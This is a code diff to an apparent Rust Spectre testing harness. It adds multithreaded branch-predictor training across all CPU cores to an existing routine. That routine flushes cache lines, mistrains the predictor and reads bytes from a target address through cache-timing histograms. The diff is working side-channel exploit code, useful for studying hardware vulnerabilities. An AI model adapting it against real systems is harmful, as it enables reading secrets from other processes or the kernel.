@@ -6,6 +6,14 @@ use core::num::Wrapping;
 
 #[cfg(feature = "std")]
 extern crate std;
+#[cfg(feature = "threading")]
+use std::sync::{Arc, Condvar, Mutex};
+#[cfg(feature = "threading")]
+use std::thread;
+#[cfg(feature = "threading")]
+extern crate libc;
+#[cfg(feature = "threading")]
+use libc::{sysconf, _SC_NPROCESSORS_CONF};
 
 mod util;
 pub use crate::util::*;
@@ -26,6 +34,8 @@ pub static mut LATENCIES: [u64; 256] = [0; 256];
 pub static mut BASE_ADDR: usize = 0;
 #[cfg(feature = "tester")]
 pub static mut MIN_NB_CYCLES: u64 = 0;
+#[cfg(feature = "tester")]
+pub static mut NB_THREADS: usize = 0;
 #[no_mangle]
 pub static mut SPECTRE_LIMIT: u64 = 16;
 #[no_mangle]
@@ -118,6 +128,13 @@ impl Spectre {
     }
 }
 
+#[cfg(feature = "threading")]
+#[derive(PartialEq)]
+enum Command {
+    RUN(usize),
+    EXIT,
+}
+
 #[cfg(feature = "tester")]
 impl Method for Spectre {
     fn nb_cycles_offset(&self) -> u64 {
@@ -130,22 +147,93 @@ impl Method for Spectre {
         target_address: *const u8,
         dest_array: &mut [u8],
     ) {
-        let target = (Wrapping(target_address as usize)
-            - Wrapping(self.spectre_speculation_base as usize))
-        .0;
+        let training_func_usize = self.training_func as usize;
         let limit = SPECTRE_LIMIT as usize;
         let base_addr = BASE_ADDR;
 
+        let training_op = move || {
+            for j in 0..2500 {
+                (std::mem::transmute::<usize, fn(usize, usize)>(training_func_usize))(
+                    base_addr,
+                    j % limit,
+                );
+            }
+        };
+
+        #[cfg(feature = "threading")]
+        let (handles, pair, finish_pair) = {
+            NB_THREADS = sysconf(_SC_NPROCESSORS_CONF) as usize;
+            let pair = Arc::new((Mutex::new(Command::RUN(0)), Condvar::new()));
+            let finish_pair = Arc::new((Mutex::new(NB_THREADS), Condvar::new()));
+
+            let mut handles = std::vec::Vec::with_capacity(NB_THREADS);
+            for _ in 0..NB_THREADS {
+                let pair = pair.clone();
+                let finish_pair = finish_pair.clone();
+
+                handles.push(thread::spawn(move || {
+                    let (lock, condvar) = &*pair;
+                    let (finish_lock, finish_condvar) = &*finish_pair;
+
+                    let mut nb_run = 0;
+
+                    loop {
+                        {
+                            let mut command = lock.lock().unwrap();
+                            // this also handles spurious wakeup
+                            while *command != Command::RUN(nb_run + 1) {
+                                command = condvar.wait(command).unwrap();
+                                if *command == Command::EXIT {
+                                    return;
+                                }
+                            }
+                        }
+
+                        nb_run += 1;
+
+                        training_op();
+
+                        let mut running_threads = finish_lock.lock().unwrap();
+                        *running_threads -= 1;
+                        finish_condvar.notify_one();
+                    }
+                }));
+            }
+            (handles, pair, finish_pair)
+        };
+
+        let target = (Wrapping(target_address as usize)
+            - Wrapping(self.spectre_speculation_base as usize))
+        .0;
+
+        #[cfg(feature = "threading")]
+        let mut nb_run = 1;
+        #[cfg(feature = "threading")]
+        let (lock, cvar) = &*pair;
+        #[cfg(feature = "threading")]
+        let (finish_lock, finish_condvar) = &*finish_pair;
         for i in 0..dest_array.len() {
             let mut histogram = [0; 256];
-            for _ in 0..2 * NB_TIMES {
+            for _ in 0..NB_TIMES {
                 // training phase
-                for i in 0..50_000 {
-                    (self.training_func)(base_addr, i % limit);
-                }
+                #[cfg(feature = "threading")]
+                {
+                    *finish_lock.lock().unwrap() = NB_THREADS;
 
-                // attack phase
+                    *lock.lock().unwrap() = Command::RUN(nb_run);
+                    nb_run += 1;
+                    cvar.notify_all();
+
+                    let mut running_threads = finish_lock.lock().unwrap();
+                    while *running_threads != 0 {
+                        running_threads = finish_condvar.wait(running_threads).unwrap();
+                    }
+                }
+                #[cfg(not(feature = "threading"))]
+                training_op();
+
                 flush_measurement_area(base_addr);
+                // attack phase
                 core::arch::x86_64::_mm_clflush(self.spectre_speculation_base as *mut u8);
                 core::arch::x86_64::_mm_clflush(self.spectre_limit_addr);
 
@@ -156,7 +244,7 @@ impl Method for Spectre {
 
                 histogram[measure_byte(self).unwrap_or(0) as usize] += 1;
             }
-            dest_array[i] = if histogram[0] == 2 * NB_TIMES {
+            dest_array[i] = if histogram[0] == NB_TIMES {
                 0
             } else {
                 histogram[1..]
@@ -166,6 +254,15 @@ impl Method for Spectre {
                     .map(|(x, _)| x as u8 + 1)
                     .unwrap()
             };
+        }
+
+        #[cfg(feature = "threading")]
+        {
+            *lock.lock().unwrap() = Command::EXIT;
+            cvar.notify_all();
+            for h in handles {
+                h.join().unwrap();
+            }
         }
     }
 }
